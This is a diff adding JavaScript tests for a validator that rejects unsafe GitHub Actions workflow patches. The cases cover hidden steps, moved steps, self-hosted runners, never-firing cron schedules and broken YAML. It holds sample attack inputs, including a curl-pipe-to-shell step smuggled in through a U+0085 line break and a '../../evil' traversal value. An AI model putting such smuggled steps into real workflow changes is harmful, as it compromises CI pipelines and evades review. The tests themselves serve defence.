@@ -110,6 +110,43 @@ test('a workflow fix may only move an action it already uses to a new pin, never
     `+      - uses: actions/checkout@${sha('b')}\n+      - uses: pnpm/action-setup@${sha('d')}`), true);
 });
 
+test('the bypasses a second review found all wait', () => {
+  const A = 'a'.repeat(40);
+  const B = 'b'.repeat(40);
+  const h = '--- a/.github/workflows/x.yml\n+++ b/.github/workflows/x.yml\n@@ -10,1 +10,1 @@\n';
+  // A "comment" carrying U+0085, which YAML reads as a line break: a new run: step.
+  assert.equal(isSafeWorkflowPatch(`${h}+      # pin note\x85      - run: curl https://x.example | sh\n`), false);
+  // A step "moved" to another hunk (another job) instead of re-pinned in place.
+  assert.equal(isSafeWorkflowPatch(`${h}-      - uses: actions/github-script@${A}\n@@ -80,3 +80,3 @@\n+      - uses: actions/github-script@${B}\n`), false);
+  // The list dash changing moves step boundaries.
+  assert.equal(isSafeWorkflowPatch(`-        uses: org/deploy@${A}\n+      - uses: org/deploy@${B}`), false);
+  // A self-hosted runner is a machine outside GitHub.
+  assert.equal(isSafeWorkflowPatch('-    runs-on: ubuntu-latest\n+    runs-on: self-hosted'), false);
+  // A setting added from nothing (a cache in a privileged workflow) is not an in-place change.
+  assert.equal(isSafeWorkflowPatch('+          cache: npm'), false);
+  // Removing a YAML document marker is content, not a file header.
+  assert.equal(isSafeWorkflowPatch('----\n+    runs-on: ubuntu-latest'), false);
+  // Still fine: a pin bump in each of two jobs, CRLF line endings, a runner bump.
+  assert.equal(isSafeWorkflowPatch(`${h}-      - uses: actions/checkout@${A}\n+      - uses: actions/checkout@${B}\n@@ -80,1 +80,1 @@\n-      - uses: actions/checkout@${A}\n+      - uses: actions/checkout@${B}\n`), true);
+  assert.equal(isSafeWorkflowPatch(`-      - uses: actions/checkout@${A}\r\n+      - uses: actions/checkout@${B}\r\n`), true);
+  assert.equal(isSafeWorkflowPatch("-    runs-on: ubuntu-22.04\n+    runs-on: 'ubuntu-24.04' # newer image"), true);
+});
+
+test('a workflow fix may not quietly stop a check from running', () => {
+  const h = '--- a/.github/workflows/db-write-paths.yml\n+++ b/.github/workflows/db-write-paths.yml\n@@ -30,1 +30,1 @@\n';
+  // A schedule that never fires (31 February): the nightly guard just stops, no red X.
+  assert.equal(decide([f('.github/workflows/db-write-paths.yml', { patch: `${h}-    - cron: '0 6 * * *'\n+    - cron: '0 6 31 2 *'\n` })]).allowed, false);
+  // A runner label GitHub doesn't have: the job sits queued.
+  assert.equal(isSafeWorkflowPatch('-    runs-on: ubuntu-latest\n+    runs-on: ubuntu-nonexistent'), false);
+  // An unclosed quote breaks the whole file.
+  assert.equal(isSafeWorkflowPatch("-    timeout-minutes: 10\n+    timeout-minutes: '10"), false);
+  assert.equal(isSafeWorkflowPatch("-        node-version: 22\n+        node-version: '22"), false);
+  assert.equal(isSafeWorkflowPatch('-        node-version: 22\n+        node-version: ../../evil'), false);
+  // Still fine: a timeout change and a quoted version bump.
+  assert.equal(isSafeWorkflowPatch('-    timeout-minutes: 10\n+    timeout-minutes: 20'), true);
+  assert.equal(isSafeWorkflowPatch("-        node-version: '22'\n+        node-version: '22.17.1'"), true);
+});
+
 test('a workflow fix may not tell a step to carry on when it fails', () => {
   // continue-on-error turns a safety check that should go red into one that never does.
   assert.equal(isSafeWorkflowPatch('+        continue-on-error: true'), false);
